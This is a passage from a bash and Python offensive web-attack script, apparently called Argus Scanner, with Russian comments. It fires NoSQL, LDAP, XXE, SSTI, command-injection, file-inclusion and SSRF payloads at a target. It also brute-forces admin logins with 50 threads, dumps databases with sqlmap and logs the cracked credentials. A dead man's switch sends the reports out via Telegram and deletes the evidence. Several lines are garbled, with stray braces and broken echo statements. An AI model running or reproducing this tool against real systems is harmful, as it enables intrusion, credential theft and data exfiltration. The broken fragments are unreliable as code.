    local target_ip=$(dig +short "$DOMAIN" 2>/dev/null | head -1); local tz="UTC"
    [ -n "$target_ip" ] && { local geo=$(curl -s "http://ip-api.com/json/$target_ip" 2>/dev/null); tz=$(echo "$geo" | grep -oP '"timezone":"[^"]*"' | cut -d'"' -f4); [ -z "$tz" ] && tz="UTC"; }
    echo -e "${GREEN}[+] Target timezone: $tz${NC}"
}

# ===== ALL INJECTIONS =====
nosql_injection() {
    local payloads=('{"$gt": ""}' '{"$ne": null}' '{"$where": "1==1"}' '{"$regex": ".*"}' "'; return true; var foo='")
    for payload in "${payloads[@]}"; do
        local r=$(proxy_curl -s -A "$(random_agent)" "$TARGET?q=$payload&search=$payload" 2>/dev/null)
        echo "$r" | grep -qi "error\|exception\|syntax\|mongodb" && echo -e "    ${RED}[!] NoSQL: $payload${NC}" && echo "NoSQL: $payload" >> "$HACKED/nosql.txt"
    done
}
ldap_injection() {
    local payloads=("'*'" "'*)(uid=*'" "'*)(|(password=*'" "'admin)(&)'")
    for payload in "${payloads[@]}"; do
        local r=$(proxy_curl -s -A "$(random_agent)" "$TARGET?user=$payload&username=$payload" 2>/dev/null)
        echo "$r" | grep -qi "ldap\|directory\|dn:" && echo -e "    ${RED}[!] LDAP: $payload${NC}" && echo "LDAP: $payload" >> "$HACKED/ldap.txt"
    done
}
    done
}

xxe_injection() {
    local payloads=('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>')
    for payload in "${payloads[@]}"; do
        local r=$(proxy_curl -s -A "$(random_agent)" -X POST -d "$payload" -H "Content-Type: application/xml" "$TARGET/api" 2>/dev/null)
        echo "$r" | grep -qi "root:\|xml\|entity" && echo -e "    ${RED}[!] XXE${NC}" && echo "XXE: $payload" >> "$HACKED/xxe.txt"
    done
}

ssti_injection() {
    local payloads=('{{7*7}}' '{{config}}' '${7*7}')
    for payload in "${payloads[@]}"; do
        local r=$(proxy_curl -s -A "$(random_agent)" "$TARGET?q=$payload&name=$payload" 2>/dev/null)
        echo "$r" | grep -q "49\|<class\|<Config" && echo -e "    ${RED}[!] SSTI: $payload${NC}" && echo "SSTI: $payload" >> "$HACKED/ssti.txt" && break
    done
}

command_injection() {
    local payloads=('; id' '| id' '`id`' '$(id)')
    for payload in "${payloads[@]}"; do
        local r=$(proxy_curl -s -A "$(random_agent)" "$TARGET?cmd=$payload&exec=$payload" 2>/dev/null)
        echo "$r" | grep -qi "uid=\|gid=" && echo -e "    ${RED}[!] CMDi: $payload${NC}" && echo "CMDi: $payload" >> "$HACKED/cmdi.txt" && break
    done
}

file_inclusion() {
    local payloads=("../../etc/passwd" "php://filter/convert.base64-encode/resource=index" "file:///etc/passwd")
    for payload in "${payloads[@]}"; do
        local r=$(proxy_curl -s -A "$(random_agent)" "$TARGET?file=$payload&page=$payload" 2>/dev/null)
        echo "$r" | grep -qi "root:\|bin/bash" && echo -e "    ${RED}[!] LFI: $payload${NC}" && echo "LFI: $payload" >> "$HACKED/file_inclusion.txt" && break
    done
}

ssrf_check() {
    local payloads=("http://127.0.0.1" "http://localhost" "http://169.254.169.254/latest/meta-data/")
    for payload in "${payloads[@]}"; do
        local r=$(proxy_curl -s -A "$(random_agent)" "$TARGET?url=$payload" 2>/dev/null)
        echo "$r" | grep -qi "root:\|ami-id" && echo -e "    ${RED}[!] SSRF: $payload${NC}" && echo "SSRF: $payload" >> "$HACKED/ssrf.txt" && break
    done
}

header_injection() {
    local payloads=("X-Forwarded-Host: evil.com" "X-Forwarded-For: 127.0.0.1" "Host: evil.com")
    for header in "${payloads[@]}"; do
        local hname="${header%%:*}"; local hvalue="${header##*: }"
        local r=$(proxy_curl -s -A "$(random_agent)" -H "$hname: $hvalue" "$TARGET" 2>/dev/null)
        echo "$r" | grep -qi "admin\|dashboard" && echo -e "    ${RED}[!] Header: $hname${NC}" && echo "Header: $hname" >> "$HACKED/header_injection.txt"
    done
}

second_order_sqli() {
    local payload="admin'--"
    proxy_curl -s -A "$(random_agent)" -X POST -d "username=test_${RANDOM}&email=$payload@test.com&password=test" "$TARGET/register" 2>/dev/null > /dev/null
    local r2=$(proxy_curl -s -A "$(random_agent)" "$TARGET/profile?email=$payload@test.com" 2>/dev/null)
    echo "$r2" | grep -qi "sql\|syntax\|error" && echo -e "    ${RED}[!] 2nd Order SQLi${NC}" && echo "2ndOrder SQLi: $payload" >> "$HACKED/second_order_sqli.txt"
}

graphql_injection() {
    echo -e "\n${CYAN}[11/24] GraphQL...${NC}"
    local endpoints=("/graphql" "/v1/graphql" "/api/graphql" "/gql" "/query" "/graphql/console")
    for ep in "${endpoints[@]}"; do
        local code=$(proxy_curl -s -o /dev/null -w "%{http_code}" -A "$(random_agent)" "$TARGET$ep" 2>/dev/null)
        if [ "$code" = "200" ]; then
            echo -e "${GREEN}[+] GraphQL: $ep${NC}"
            printf "\u007b__schema{types{name fields{name}}}\u007d\n" > /tmp/gql_payloads.txt
            printf "\u007buser(id:1){email password}\u007d\n" >> /tmp/gql_payloads.txt
            printf "query{__type(name:\"User\"){fields{name}}}\n" >> /tmp/gql_payloads.txt
            while read payload; do
                [ -z "$payload" ] && continue
                local r=$(proxy_curl -s -A "$(random_agent)" -X POST -H "Content-Type: application/json" -d "{\"query\":\"$payload\"}" "$TARGET$ep" 2>/dev/null)
                echo "$r" | grep -qiE "password|email|schema|__schema|fields" && echo -e "    ${RED}[!] GraphQL: $payload${NC}" && echo "GraphQL: $payload @ $ep" >> "$HACKED/graphql.txt"
            done < /tmp/gql_payloads.txt
            rm -f /tmp/gql_payloads.txt
        fi
    done
}

websocket_injection() {
    echo -e "\n${CYAN}[12/24] WebSocket...${NC}"
    for ep in "/ws" "/websocket" "/socket" "/realtime" "/stream"; do
        local code=$(proxy_curl -s -o /dev/null -w "%{http_code}" -A "$(random_agent)" -H "Upgrade: websocket" -H "Connection: Upgrade" "$TARGET$ep" 2>/dev/null)
        if [ "$code" = "101" ] || [ "$code" = "426" ]; then
            echo -e "${GREEN}[+] WebSocket: $ep${NC}"
            echo "WebSocket: $ep" >> "$HACKED/websocket.txt"
        fi
    done
}

# ===== CVE + EXPLOIT SCAN =====
local_full_cve_lookup() {
    local product=$1 version=$2
    [ ! -d "$CVE_DB_DIR" ] && return 1
    grep -rn "$product" "$CVE_DB_DIR" 2>/dev/null | grep -i "$version" | head -5 | while read line; do
        local cve=$(echo "$line" | grep -oP 'CVE-\d{4}-\d{4,}' | head -1)
        [ -n "$cve" ] && echo -e "    ${RED}[CVE] $cve${NC}" && echo "CVE: $cve ($product $version)" >> "$HACKED/cve.txt"
    done
}

local_exploit_search() {
    local product=$1
    [ ! -d "$EXPLOIT_DB_DIR" ] && return 1
    grep -rn "$product" "$EXPLOIT_DB_DIR" 2>/dev/null | head -5 | while read line; do
        local file=$(echo "$line" | cut -d: -f1); local desc=$(echo "$line" | cut -d: -f3- | head -c 80)
        echo -e "    ${RED}[EXPLOIT] $(basename $file): ${desc}...${NC}"
        echo "EXPLOIT: $(basename $file)" >> "$HACKED/exploits.txt"
    done
}

cve_exploit_scan() {
    local nmap_file="$REPORT/nmap.txt"; [ ! -f "$nmap_file" ] && return
    grep -oP '\S+/\S+\s+\S+\s+\S+\s+\K.*' "$nmap_file" 2>/dev/null | while read line; do
        local product=$(echo "$line" | awk '{print $1}' | cut -d/ -f1 | tr '[:upper:]' '[:lower:]')
        local version=$(echo "$line" | awk '{print $2}' | grep -oP '[\d.]+' | head -1)
        [ -n "$version" ] && { local_full_cve_lookup "$product" "$version"; local_exploit_search "$product"; }
    done
}

# ===== CHAIN BUILDER =====
CHAIN_WHITELIST="$HOME/.chain_whitelist.txt"
echo "demo.testfire.net" > "$CHAIN_WHITELIST"; echo "testphp.vulnweb.com" >> "$CHAIN_WHITELIST"

chain_builder() {
    local trigger_file=$1
    local target=$2
    local domain=$(echo "$target" | sed "s|https\?://||" | cut -d/ -f1)
    grep -qi "$domain" "$CHAIN_WHITELIST" 2>/dev/null || return
    echo -e "\n${RED}[CHAIN] Auto-RCE${NC}"
    grep -qi "injectable\|SQL" "$trigger_file" 2>/dev/null && {
        sqlmap -u "$target" --batch --dbs --tables --dump --threads=3 --output-dir="$REPORT/chain" 2>/dev/null
        find "$REPORT/chain" -name "*.csv" -exec grep -qi "password\|admin" {} \; 2>/dev/null && echo -e "${GREEN}[CHAIN] Credentials found!${NC}"
    }
}
}

# ===== DEAD MAN'S SWITCH =====
DEAD_MAN_FILE="$HOME/.deadman_switch"; DEAD_MAN_TIMEOUT=86400
dead_mans_switch() {
    date +%s > "$DEAD_MAN_FILE"
    (while true; do sleep 3600
        [ -f "$DEAD_MAN_FILE" ] && { last=$(cat "$DEAD_MAN_FILE"); [ $(( $(date +%s) - last )) -gt $DEAD_MAN_TIMEOUT ] && {
            for f in "$REPORT"/*.txt "$REPORT"/*.pdf "$REPORT"/*.html "$REPORT"/*.json "$REPORT"/*.csv "$REPORT"/*.xml; do [ -f "$f" ] && tg_send_file "$f"; done
            tg_send "🚨 <b>DEAD MAN'S SWITCH!</b>"; rm -f ~/argus.sh ~/passwords.txt ~/default_creds.txt 2>/dev/null; exit 0; }; }
    done) &
}

deadman_checkin() { date +%s > "$DEAD_MAN_FILE"; }

# ===== P2P CVE SYNC =====
p2p_cve_update() {
    local my_ip=$(ip addr show wlan0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1); [ -z "$my_ip" ] && my_ip="127.0.0.1"
    local network=$(echo "$my_ip" | cut -d. -f1-3); local peers=0
    for i in {1..254}; do timeout 1 bash -c "echo >/dev/tcp/$network.$i/5000" 2>/dev/null && peers=$((peers + 1)); done
    echo -e "${GREEN}[+] P2P: $peers peers${NC}"
}

# ===== SOCIAL OSINT =====
social_osint() {
    [ "$OFFLINE" = true ] && echo -e "  ${YELLOW}[OFFLINE] Social OSINT пропущен${NC}" && return
    local domain="$1"; local org_name=$(echo "$domain" | cut -d. -f1)
    curl -s "https://www.linkedin.com/company/$org_name/people/" 2>/dev/null | grep -oP 'title="[^"]*"' | cut -d'"' -f2 | head -10 > "$OSINT/linkedin.txt"
    curl -s "https://api.github.com/search/users?q=org:$org_name" 2>/dev/null | grep -oP '"login":"[^"]*"' | cut -d'"' -f4 | head -10 > "$OSINT/github.txt"
}

# ===== OSINT 10 ИСТОЧНИКОВ =====
[ -n "$CVE_PID" ] && wait $CVE_PID 2>/dev/null
# Agentic + Supply Chain (Будущее)
echo -e "\n${CYAN}[*] API Auto-Detect...${NC}"
${CYAN}[*] Agentic Workflow...${NC}"
[ -x ~/shadow_agentic.sh ] && ~/shadow_agentic.sh "$TARGET" &

echo -e "\n${CYAN}[*] API Auto-Detect...${NC}"
${CYAN}[*] Supply Chain Hunter...${NC}"
[ -x ~/shadow_supply_chain.sh ] && ~/shadow_supply_chain.sh "$TARGET" &

wait
osint_collect() {
    [ "$OFFLINE" = true ] && echo -e "  ${YELLOW}[OFFLINE] OSINT пропущен${NC}" && return
    local domain="$DOMAIN"
    echo -e "\n${CYAN}[2/24] OSINT (10 sources)...${NC}"
    > "$OSINT/subdomains.txt"
    curl -s "https://crt.sh/?q=%25.$domain&output=json" 2>/dev/null | grep -oP '"name_value":"[^"]*"' | cut -d'"' -f4 | sort -u | grep -v "^*" >> "$OSINT/subdomains.txt"
    curl -s "https://otx.alienvault.com/api/v1/indicators/domain/$domain/passive_dns" 2>/dev/null | grep -oP '"hostname":"[^"]*"' | cut -d'"' -f4 | sort -u >> "$OSINT/subdomains.txt"
    curl -s "http://web.archive.org/cdx/search/cdx?url=*.$domain/*&output=json&fl=original&collapse=urlkey" 2>/dev/null | grep -oP '"[^"]*"' | tr -d '"' | grep -i "$domain" | sed 's|https\?://||;s|/.*||' | sort -u >> "$OSINT/subdomains.txt"
    curl -s "https://urlscan.io/api/v1/search/?q=domain:$domain" 2>/dev/null | grep -oP '"domain":"[^"]*"' | cut -d'"' -f4 | sort -u >> "$OSINT/subdomains.txt"
    [ -n "$VIRUSTOTAL_API" ] && curl -s "https://www.virustotal.com/api/v3/domains/$domain/subdomains?limit=100" -H "x-apikey: $VIRUSTOTAL_API" 2>/dev/null | grep -oP '"id":"[^"]*"' | cut -d'"' -f4 >> "$OSINT/subdomains.txt"
    curl -s "https://api.certspotter.com/v1/issuances?domain=$domain&include_subdomains=true&expand=dns_names" 2>/dev/null | grep -oP '"[^"]*\.[^"]*"' | tr -d '"' | grep -i "$domain" | sort -u >> "$OSINT/subdomains.txt"
    curl -s "https://api.hackertarget.com/hostsearch/?q=$domain" 2>/dev/null | cut -d',' -f1 | sort -u >> "$OSINT/subdomains.txt"
    [ -n "$SECURITYTRAILS_API" ] && curl -s "https://api.securitytrails.com/v1/domain/$domain/subdomains?apikey=$SECURITYTRAILS_API" 2>/dev/null | grep -oP '"[^"]*\.[^"]*"' | tr -d '"' | sed "s/$/\.$domain/" >> "$OSINT/subdomains.txt"
    [ -n "$SHODAN_API" ] && curl -s "https://api.shodan.io/dns/domain/$domain?key=$SHODAN_API" 2>/dev/null | grep -oP '"subdomain":"[^"]*"' | cut -d'"' -f4 >> "$OSINT/subdomains.txt"
    sort -u "$OSINT/subdomains.txt" -o "$OSINT/subdomains.txt"
    echo -e "${GREEN}[+] Subdomains: $(wc -l < "$OSINT/subdomains.txt")${NC}"
}

cms_detect

# Поиск форм логина в HTML
echo -e "\n${CYAN}[*] API Auto-Detect...${NC}"
${CYAN}[*] Form detection...${NC}"
HTML=$(curl -s --max-time 10 "$TARGET" 2>/dev/null)
if echo "$HTML" | grep -qi '<form.*login\|<form.*signin\|<form.*auth'; then
    FORM_ACTION=$(echo "$HTML" | grep -oP '<form[^>]*action="([^"]*)"' | head -1 | grep -oP 'action="\K[^"]*')
    [ -n "$FORM_ACTION" ] && echo -e "${GREEN}[+] Login form: $FORM_ACTION${NC}" && LOGIN="$TARGET$FORM_ACTION"
cms_detect

# ===== API AUTO-DETECT =====
echo -e "\n${CYAN}[*] API Auto-Detect...${NC}"
${CYAN}[*] API Auto-Detect...${NC}"
API_ENDPOINTS=(
    "/api/v1/users" "/api/v2/auth" "/api/auth/login" "/api/users/me"
    "/graphql" "/v1/graphql" "/api/graphql"
    "/.well-known/openapi.json" "/swagger.json" "/openapi.json"
    "/api-docs" "/swagger-ui.html" "/redoc"
    "/api/health" "/api/status" "/api/ping"
    "/rest/api/latest" "/services/rest"
)
for api_ep in "${API_ENDPOINTS[@]}"; do
    code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "$TARGET$api_ep" 2>/dev/null)
    if [ "$code" != "404" ] && [ "$code" != "000" ]; then
        echo -e "    ${GREEN}[API] $api_ep [HTTP $code]${NC}"
        echo "$TARGET$api_ep [$code]" >> "$REPORT/api_endpoints.txt"
    fi
done

# Проверка JSON ответа на API
for api_url in "$TARGET/api" "$TARGET/api/v1" "$TARGET/graphql"; do
    resp=$(curl -s --max-time 5 -H "Content-Type: application/json" "$api_url" 2>/dev/null)
    if echo "$resp" | python3 -c "import sys,json; json.load(sys.stdin)" 2>/dev/null; then
        echo -e "    ${GREEN}[API] JSON API detected: $api_url${NC}"
        echo "$api_url [JSON]" >> "$REPORT/api_endpoints.txt"
        break
    fi
done

async_dir_brute() {
    echo -e "\n${CYAN}[4/24] Directories...${NC}"
    local dirs=(/admin /wp-admin /login /panel /backup /.git /.env /robots.txt /phpinfo.php /api /debug /wp-login.php /administrator /swagger /swagger/index.html /api-docs /graphql /actuator /metrics /health)
    printf "%s\n" "${dirs[@]}" | xargs -P 5 -I {} bash -c "code=\$(proxy_curl -s -o /dev/null -w '%{http_code}' -A '$(random_agent)' '$TARGET{}' 2>/dev/null); [ \"\$code\" != '404' ] && [ \"\$code\" != '000' ] && echo -e \"    \033[92m[\$code]\033[0m $TARGET{}\" && echo \"$TARGET{} [\$code]\" >> '$REPORT/dirs.txt'"
}

# ===== BRUTE FORCE 50 THREADS =====
async_brute() {
    local LOGIN=$1
    local pass_count=$(cat ~/passwords.txt | tr ';' '\n' | wc -l)
    local chunk_size=1000
    echo -e "${YELLOW}[*] Brute Force (50 threads, $pass_count passwords)...${NC}"
    cat ~/passwords.txt | tr ';' '\n' > /tmp/passlist.txt
    split -l $chunk_size /tmp/passlist.txt /tmp/pass_chunk_
    for chunk in /tmp/pass_chunk_*; do
        echo -e "${BLUE}[*] Chunk: $(basename $chunk) ($(wc -l < $chunk) lines)${NC}"
        cat "$chunk" | xargs -P 50 -I {} bash -c "
            r=\$(proxy_curl -s -A '$(random_agent)' -d 'username=admin&password={}' '$LOGIN' 2>/dev/null)
            if ! echo \"\$r\" | grep -qi 'incorrect\|invalid\|wrong\|error\|неверный'; then
                echo -e \"    \033[91m[!] CRACKED: admin / {}\033[0m\"
                echo \"admin:{} @ $LOGIN\" >> '$HACKED/credentials.txt'
            fi
        "
        sleep 1
    done
    rm -f /tmp/pass_chunk_*
}

leak_check() {
    [ -f "$OSINT/emails.txt" ] && while read email; do
        local result=$(curl -s "https://haveibeenpwned.com/api/v3/breachedaccount/$email" 2>/dev/null | grep -oP '"Name":"[^"]*"' | cut -d'"' -f4 | head -5)
        [ -n "$result" ] && echo -e "    ${RED}[!] LEAKED: $email${NC}" && echo "$email" >> "$HACKED/leaks.txt"
    done < "$OSINT/emails.txt"
}

subdomain_takeover() {
    [ -f "$OSINT/subdomains.txt" ] && while read sub; do
        local html=$(proxy_curl -s -A "$(random_agent)" "http://$sub" 2>/dev/null)
        echo "$html" | grep -qi "no such app\|not found\|domain doesn't exist" && echo -e "    ${RED}[!] TAKEOVER: $sub${NC}" && echo "$sub - TAKEOVER" >> "$HACKED/takeover.txt"
    done < "$OSINT/subdomains.txt"
}

hidden_params() {
    local params=(id user page file admin debug test api token auth redirect url return)
    for param in "${params[@]}"; do
        local code=$(proxy_curl -s -o /dev/null -w "%{http_code}" -A "$(random_agent)" "$TARGET?$param=test" 2>/dev/null)
        [ "$code" != "404" ] && [ "$code" != "000" ] && echo -e "    ${GREEN}[$code] $param${NC}" && echo "Parameter: $param" >> "$HACKED/hidden_params.txt"
    done
}

# ===== REPORTS =====
generate_html_report() {
    local html="$REPORT/report.html"
    cat > "$html" << HTMLEOF
<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Argus Scanner v47.0 PRO</title>
<style>body{font-family:Arial;background:#0d1117;color:#c9d1d9;padding:20px;max-width:1000px;margin:0 auto}
h1{color:#58a6ff}h2{color:#f0883e}.card{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:15px;margin:10px 0}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:10px}
.stat{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:15px;text-align:center}
.stat .value{font-size:32px;font-weight:bold}.stat .label{color:#8b949e;font-size:11px}
pre{background:#0d1117;border:1px solid #30363d;border-radius:4px;padding:10px;overflow-x:auto}</style></head>
<body><h1>Argus Scanner v47.0 PRO Report</h1>
<div class="card"><p><strong>Target:</strong> $TARGET</p><p><strong>Date:</strong> $(date)</p></div>
<div class="grid">
<div class="stat"><div class="value">$(grep -c 'open' $REPORT/nmap.txt 2>/dev/null||echo 0)</div><div class="label">Open Ports</div></div>
<div class="stat"><div class="value">$(wc -l < $REPORT/dirs.txt 2>/dev/null||echo 0)</div><div class="label">Directories</div></div>
<div class="stat"><div class="value">$(wc -l < $REPORT/nuclei_results.txt 2>/dev/null||echo 0)</div><div class="label">Nuclei</div></div>
<div class="stat"><div class="value">$(wc -l < $HOME/passive_scan.txt 2>/dev/null||echo 0)</div><div class="label">Passive</div></div>
<div class="stat"><div class="value">$([ -s $HACKED/credentials.txt ] && echo 'YES' || echo 'NO')</div><div class="label">Credentials</div></div>
</div></body></html>
HTMLEOF
    echo -e "${GREEN}[+] HTML: $html${NC}"
}

generate_json_report() {
    cat > "$REPORT/report.json" << JSONEOF
{"scanner":"v47.0","date":"$(date)","target":"$TARGET","ports":$(grep -c 'open' "$REPORT/nmap.txt" 2>/dev/null||echo 0),"dirs":$(wc -l < "$REPORT/dirs.txt" 2>/dev/null||echo 0),"nuclei":$(wc -l < "$REPORT/nuclei_results.txt" 2>/dev/null||echo 0),"passive":$(wc -l < "$HOME/passive_scan.txt" 2>/dev/null||echo 0)}
JSONEOF
}

generate_csv_report() {
    local csv="$REPORT/report.csv"
    echo "Type,Detail,Severity" > "$csv"
    [ -f "$HACKED/sql_dump.txt" ] && echo "SQL_Injection,Database_dumped,Critical" >> "$csv"
    [ -f "$HACKED/xss.txt" ] && echo "XSS,Reflected,High" >> "$csv"
    [ -f "$HACKED/credentials.txt" ] && echo "Credentials,Found,Critical" >> "$csv"
    [ -f "$HACKED/cve.txt" ] && awk '{print "CVE,"$0",High"}' "$HACKED/cve.txt" >> "$csv"
    [ -f "$REPORT/nuclei_results.txt" ] && awk '{print "Nuclei,"$0",High"}' "$REPORT/nuclei_results.txt" >> "$csv"
}

generate_xml_report() {
    cat > "$REPORT/report.xml" << XMLEOF
<?xml version="1.0"?><scan scanner="v47.0" date="$(date)" target="$TARGET"><ports>$(grep -c 'open' "$REPORT/nmap.txt" 2>/dev/null||echo 0)</ports><dirs>$(wc -l < "$REPORT/dirs.txt" 2>/dev/null||echo 0)</dirs></scan>
XMLEOF
}

# ===== COLLABORATOR =====
start_collaborator() {
    local port=${1:-8888}
    cat > ~/collab.py << PYEOF
import http.server, socketserver
from datetime import datetime
collab_log = "$REPORT/collaborator_hits.txt"
class C(http.server.BaseHTTPRequestHandler):
    def do_GET(self): self.hit('GET'); self.send_response(200); self.end_headers()
    def do_POST(self): self.hit('POST'); self.send_response(200); self.end_headers()
    def hit(self, method):
        with open(collab_log, 'a') as f: f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {method} {self.path} from {self.client_address[0]}\\n")
if __name__ == '__main__':
    with socketserver.TCPServer(('0.0.0.0', $port), C) as httpd:
        try: httpd.serve_forever()
        except KeyboardInterrupt: pass
PYEOF
    python ~/collab.py &
    COLLAB_PID=$!
}

generate_pdf_report() {
    cat > ~/pdf_gen.py << PYEOF
html_file = "$HTML_FILE"; pdf_file = "${REPORT}/report.pdf"
try:
    from weasyprint import HTML; HTML(filename=html_file).write_pdf(pdf_file)
except:
    with open(pdf_file, 'w') as f: f.write('%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n3 0 obj<</Type/Page/MediaBox[0 0 612 792]>>endobj\nxref\n0 4\n0000000000 65535 f \n0000000009 00000 n \n0000000058 00000 n \n0000000115 00000 n \ntrailer\n<</Size 4/Root 1 0 R>>\nstartxref\n178\n%%EOF')
PYEOF
    python ~/pdf_gen.py
}

# ===== PASSIVE SCANNER + REPEATER + HTTPS + WS + INTRUDER + COOKIE JAR =====
start_passive_scanner() {
    if [ ! -f ~/scanner_cert.pem ]; then
        openssl req -x509 -newkey rsa:2048 -keyout ~/scanner_key.pem -out ~/scanner_cert.pem -days 365 -nodes -subj "/CN=SuperScanner CA" 2>/dev/null
    fi
    
    cat > /data/data/com.termux/files/home/shadow_shadow_passive.py << 'PYEOF'
import http.server, socketserver, re, os, ssl, threading, json, time, urllib.request, urllib.parse
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

PASSIVE_LOG = os.path.expanduser('~/shadow_scan.txt')
REPEATER_LOG = os.path.expanduser('~/repeater_log.txt')
WS_LOG = os.path.expanduser('~/websocket_log.txt')
COOKIE_JAR_FILE = os.path.expanduser('~/.cookie_jar.json')
INTERCEPT_MODE = False
HISTORY = []
MAX_HISTORY = 50

PATTERNS = {
    'SQLi': [r"'(?:\s*OR\s*|\s*AND\s*)", r'union\s+select', r'\d+\s*=\s*\d+\s*--'],
    'XSS': [r'<script', r'alert\(', r'onerror\s*=', r'javascript:', r'<img[^>]+onerror'],
    'LFI': [r'\.\./\.\./', r'/etc/passwd', r'php://filter', r'file:///'],
    'Token': [r'api[_-]?key\s*=\s*[\w-]+', r'bearer\s+[\w-]+', r'secret\s*=\s*[\w-]+'],
    'CORS': [r'Access-Control-Allow-Origin:\s*\*'],
    'CSP_Missing': [r'Content-Security-Policy'],
    'DirectoryListing': [r'Index of /', r'Parent Directory'],
    'SQL_Error': [r'SQL syntax', r'mysql_fetch', r'ORA-\d+', r'PostgreSQL', r'sqlite3\.'],
    'PHP_Error': [r'PHP Notice', r'PHP Warning', r'PHP Fatal error'],
    'DebugMode': [r'debug\s*=\s*true', r'APP_DEBUG=true', r'ENV=development'],
    'S3Buckets': [r's3\.amazonaws\.com', r'[a-z0-9-]+\.s3\.'],
    'GithubTokens': [r'gh[pousr]_[A-Za-z0-9_]{36,}'],
    'JWT_Tokens': [r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}'],
    'PrivateKeys': [r'-----BEGIN (RSA|DSA|EC|OPENSSH|PGP) PRIVATE KEY-----'],
    'WordPress': [r'wp-content', r'wp-includes', r'wp-json'],
    'Drupal': [r'sites/all', r'sites/default'],
    'Joomla': [r'com_content', r'com_users'],
    'SpringBoot': [r'actuator', r'swagger-ui'],
    'Laravel': [r'laravel_session', r'XSRF-TOKEN'],
    'Django': [r'csrftoken', r'django\.'],
    'OpenRedirect': [r'redirect\s*=', r'url\s*=', r'next\s*=', r'return\s*='],
    'SSRF_Params': [r'url\s*=\s*http', r'proxy\s*=\s*http'],
    'FileUpload': [r'multipart/form-data'],
    'XXE': [r'<!ENTITY', r'<!DOCTYPE'],
    'NoSQL': [r'\{\$gt', r'\{\$ne', r'\{\$where'],
    'GraphQL': [r'__schema', r'query\s*\{'],
    'WebSocket': [r'Upgrade:\s*websocket', r'ws://', r'wss://']
}

# ===== COOKIE JAR =====
def load_jar():
    try:
        with open(COOKIE_JAR_FILE) as f:
            return json.load(f)
    except:
        return {}

def save_jar(jar):
    with open(COOKIE_JAR_FILE, 'w') as f:
        json.dump(jar, f, indent=2)

def update_cookies(domain, set_cookie_header):
    jar = load_jar()
    if domain not in jar:
        jar[domain] = {}
    if set_cookie_header:
        for cookie_str in set_cookie_header.split(','):
            cookie_str = cookie_str.strip()
            if '=' in cookie_str:
                parts = cookie_str.split(';')[0].strip()
                if '=' in parts:
                    k, v = parts.split('=', 1)
                    jar[domain][k.strip()] = v.strip()
    save_jar(jar)

def get_cookies_string(domain):
    jar = load_jar()
    if domain in jar and jar[domain]:
        return '; '.join([f'{k}={v}' for k,v in jar[domain].items()])
    return ''

# ===== INTRUDER =====
def run_intruder(method, url, headers, body, param_name, wordlist_name):
    wordlist_dir = os.path.expanduser('~/intruder_wordlists')
    wordlist_file = os.path.join(wordlist_dir, f'{wordlist_name}.txt')
    if not os.path.exists(wordlist_file):
        wordlist_file = os.path.join(wordlist_dir, 'common.txt')
    if not os.path.exists(wordlist_file):
        print(f"\033[91m[INTRUDER] Wordlist not found: {wordlist_name}\033[0m")
        return
    
    with open(wordlist_file) as f:
        words = [line.strip() for line in f if line.strip()]
    
    print(f"\n\033[95m[INTRUDER] Starting attack on '{param_name}' with {len(words)} payloads\033[0m")
    print(f"\033[95m[INTRUDER] Wordlist: {wordlist_name}\033[0m")
    print(f"{'='*60}")
    
    results = []
    parsed_url = urlparse(url)
    
    for i, word in enumerate(words):
        # Replace in URL path/query
        new_url = url
        if param_name in new_url:
            new_url = new_url.replace(param_name, word)
        else:
            # Add as query parameter
            if '?' in new_url:
                new_url += f'&{param_name}={urllib.parse.quote(word)}'
            else:
                new_url += f'?{param_name}={urllib.parse.quote(word)}'
        
        # Replace in body
        new_body = body
        if body and param_name in body:
            new_body = body.replace(param_name, word)
        
        try:
            req = urllib.request.Request(new_url, method=method)
            for k, v in headers.items():
                if k.lower() not in ['host', 'content-length']:
                    req.add_header(k, v)
            if new_body:
                req.data = new_body.encode()
            
            start_time = time.time()
            with urllib.request.urlopen(req, timeout=10) as resp:
                resp_body = resp.read()
                elapsed = time.time() - start_time
                results.append({
                    'payload': word,
                    'status': resp.status,
                    'length': len(resp_body),
                    'time': elapsed
                })
                
                # Highlight anomalies
                marker = ''
                if resp.status in [200, 201, 202]:
                    marker = '\033[92m●\033[0m'
                elif resp.status in [301, 302]:
                    marker = '\033[93m●\033[0m'
                elif resp.status == 500:
                    marker = '\033[91m●\033[0m'
                elif resp.status in [401, 403]:
                    marker = '\033[90m●\033[0m'
                
                print(f"{marker} [{resp.status}] {word:20s} | {len(resp_body):6d}b | {elapsed:.2f}s")
        except Exception as e:
            print(f"\033[91m✗\033[0m [ERR] {word:20s} | {str(e)[:40]}")
        
        if (i+1) % 10 == 0:
            print(f"  --- {i+1}/{len(words)} ---")
    
    # Summary
    print(f"\n{'='*60}")
    print(f"\033[95m[INTRUDER] Attack complete. {len(results)} responses\033[0m")
    
    # Find interesting responses
    statuses = {}
    for r in results:
        s = r['status']
        if s not in statuses: statuses[s] = []
        statuses[s].append(r)
    
    for status, items in sorted(statuses.items()):
        avg_len = sum(x['length'] for x in items) / len(items)
        print(f"  HTTP {status}: {len(items)} responses, avg length: {avg_len:.0f}b")
    
    return results

class PassiveScanner(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.handle_request('GET')
    
    def do_POST(self):
        self.handle_request('POST')
    
    def do_PUT(self):
        self.handle_request('PUT')
    
    def do_DELETE(self):
        self.handle_request('DELETE')
    
    def do_CONNECT(self):
        self.handle_request('CONNECT')
    
    def handle_request(self, method):
        global INTERCEPT_MODE
        client_ip = self.client_address[0]
        path = self.path
        headers = dict(self.headers)
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length).decode('utf-8', errors='ignore') if content_length else ''
        
        # ===== COOKIE JAR: Capture =====
